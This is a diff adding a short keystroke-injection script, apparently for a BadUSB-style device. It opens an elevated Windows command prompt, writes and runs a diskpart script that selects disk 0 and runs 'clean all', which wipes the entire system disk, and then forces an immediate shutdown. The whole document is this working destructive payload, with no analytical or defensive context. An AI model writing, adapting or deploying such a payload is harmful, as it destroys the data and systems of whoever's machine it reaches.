@@ -1,0 +1,11 @@
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd
+CTRL SHIFT ENTER
+DELAY 2000
+STRING echo select disk 0 > %temp%\d.txt & echo clean all >> %temp%\d.txt & diskpart /s %temp%\d.txt
+ENTER
+DELAY 1000
+STRING shutdown /s /t 0
+ENTER
